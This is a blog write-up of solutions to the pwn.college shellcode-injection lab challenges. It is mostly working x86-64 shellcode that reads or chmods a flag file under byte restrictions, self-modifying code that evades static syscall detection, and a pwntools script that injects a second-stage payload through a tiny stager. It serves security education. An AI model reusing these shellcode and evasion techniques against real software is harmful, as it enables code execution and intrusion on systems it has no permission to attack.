---
layout: post
title:  "Pwn College - Shellcode Injection"
date:   2024-04-26 19:59:47 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

x64 Shellcoding module, each stage having its own different constraint. \
Latter challenges deals with some very non-trivial yet powerful tricks. 

## Important Notes

All challenges were compiled via:

```bash
gcc -Wl,-N -nostdlib -static asm.s -o asm
objcopy -O binary -j .text ./asm ./asm_bytes
```

The `-Wl,-N` options allows writing into the text segment, which is crucial for testing (as the whole shellcode is mapped as `RWX`). 

For a working `/bin/sh` shellcode, it is required to pass an `-p` flag as `argv[1]`. Otherwise, Permissions would drop by default. 


## Challenge 1

```bash
.globl _start
_start:
.intel_syntax noprefix
mov rbx, 0x00000067616c662f  # /flag
push rbx
mov rax, 2   # OPEN syscall
mov rdi, rsp
mov rsi, 0   # O_RDONLY
syscall
mov rdi, 1  # stdout fd
mov rsi, rax  # fd returned via open
mov rdx, 0  # offset
mov r10, 1000  # count to transfer
mov rax, 40   # sendfile syscall
syscall
mov rax, 60  # exit
syscall
```

## Challenge 2

Add `NOP` sled at the shellcode's start:

```bash
.rept 0x800
nop
.endr
```

## Challenge 3

No null bytes shellcode. \
Ugly tricks with xor and sub:

```bash
.globl _start
_start:
.intel_syntax noprefix
xor rbx, rbx
mov rbx, 0x01010168626d6730
mov r12, 0x0101010101010101
sub rbx, r12
#xor rbx, 0x6060606020
#xor rbx, 0x07010c060f  # /flag
push rbx
xor rax, rax
inc rax
inc rax
mov rdi, rsp
xor rsi, rsi
syscall

xor rdi, rdi
inc rdi
mov rsi, rax  # fd returned via open
xor rdx, rdx
#mov r10, 1000  # count to transfer
xor r10, r10
xor r10, 0x111102e9
xor r10, 0x11110101

xor rax, rax
xor rax, 0x01010120   # sendfile syscall
xor rax, 0x01010108
syscall
```

## Challenge 4

Cannot have byte 0x48, hence no operations involving direct registers assignments such as `mov rax, val`. \
Did some manipulations with `push` and `pop`:

```bash
.globl _start
_start:
.intel_syntax noprefix
#mov rbx, 0x00000067616c662f  # /flag

push 0x67
pop rbx

push rbx
mov dword ptr[rsp + 4], ebx
mov dword ptr[rsp], 0x616c662f
pop rbx

push rbx

pushq 2
pop rax
#mov rax, 2

push rsp
pop rdi
#mov rdi, rsp

push 0
pop rsi
#mov rsi, 0   # O_RDONLY
syscall

push 1
pop rdi
# mov rdi, 1  # stdout fd
push rax
pop rsi
#mov rsi, rax  # fd returned via open
push 0
pop rdx
#mov rdx, 0  # offset
push 1000
pop r10
#mov r10, 1000  # count to transfer
push 40
pop rax
#mov rax, 40   # sendfile syscall
syscall
```

## Challenge 5

There's a static syscall detection mitigation. \
Hence, we cannot use any of the following:

```bash
syscall, 0x0f05
sysenter, 0x0f04
int 0x80, 0x80cd
```

We'd use polymorphic shellcode, that patches itself at runtime:

```bash
.globl _start
_start:
.intel_syntax noprefix
#mov rbx, 0x00000067616c662f  # /flag

push 0x67
pop rbx

push rbx
mov dword ptr[rsp + 4], ebx
mov dword ptr[rsp], 0x616c662f
pop rbx

push rbx

pushq 2
pop rax
#mov rax, 2

push rsp
pop rdi
#mov rdi, rsp

push 0
pop rsi
#mov rsi, 0   # O_RDONLY
dec byte ptr[rip + 1]
.byte 0x0f
.byte 0x06
#syscall

push 1
pop rdi
# mov rdi, 1  # stdout fd
push rax
pop rsi
#mov rsi, rax  # fd returned via open
push 0
pop rdx
#mov rdx, 0  # offset
push 1000
pop r10
#mov r10, 1000  # count to transfer
push 40
pop rax
#mov rax, 40   # sendfile syscall
dec byte ptr[rip + 1]
.byte 0x0f
.byte 0x06
#syscall
```

## Challenge 6

Same, but for non-writeable shellcode. \
Note the limitation is only for the first page (aka first 4096 bytes). Afterwards, memory is writeable. 

## Challenge 7

This time, no stdout. \
Simply communicate via a regular file, so add the following:

```bash
mov rbx, 0x612f706d742f
push rbx
mov rax, 2
mov rdi, rsp
mov rsi, 2  # O_RDWR
syscall
mov r13, rax  # save fd
```

And use `r13` as the file descriptor for `sendfile() ` syscall. \
The result will be in /tmp/a.

## Challenge 8

```bash
start:
    #open
    mov sil, 0x7
    lea rdi, [rip+flag]
    mov al, 90
    syscall
flag:
    .ascii "a\0"
```

## Challenge 9

Every other 10 bytes are transformed to `int3`. 

```bash
mov sil, 0x7  # 3
jmp label_1   # 2
.rept 15
nop
.endr

label_1:
lea rdi, [rip+flag] # 7
jmp label_2
.rept 11
nop
.endr

label_2:
mov al, 90 # 2
syscall    # 2
.rept 16
nop
.endr

flag:
    .ascii "a\0"
```


## Challenge 10 + 11

Uses a bubble sort (each chunk is a number, represented by 8 bytes). \
As long as the shellcode is less than 16 bytes, its very easy. Challenge 8 solution works here.

## Challenge 12

Unique bytes shellcode:

```bash
mov sil, 0x7
push 0x61
push rsp
pop rdi
mov al, 90
syscall
```

## Challenge 13

Exteremly small shellcode, 12 bytes. \
The above works (9 bytes only). \
The trick is to use the chmod syscall. 

## Challenge 14

6 byte shellcode. damn.

We will use a small stager, that will only trigger arbitrary read from stdin:

```bash
push rax
pop rdi  # rdi now contains 0 == STDIN, with only 2 bytes
push rdx
pop rsi   # points towards our shellcode (need to pad with 6 bytes)
# rax default value is 0 (read)
syscall
```

Then, we have to insert 6*A + our desired shellcode. 

The following python script injects the desired payload after the stager have executed:

```python
import pwn
from glob import glob

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'
pwn.context.encoding = 'latin'  # check this
pwn.context.log_level = 'INFO'
pwn.warnings.simplefilter('ignore')

assembly = """
push rax
pop rdi
push rdx
pop rsi
syscall
"""

print('My shellcode:')
print(assembly)

payload = """
mov rsi, 0x7
push 0x61
push rsp
pop rdi
mov al, 90
syscall
"""

padding = str('A' * 6).encode('ascii')
print(type(padding))

with pwn.process(glob("/challenge/babyshell_level14")) as p:
    pwn.info(p.readrepeat(1))
    p.send(pwn.asm(assembly))
    pwn.info(p.readrepeat(1))
    p.send(padding + pwn.asm(payload))
```
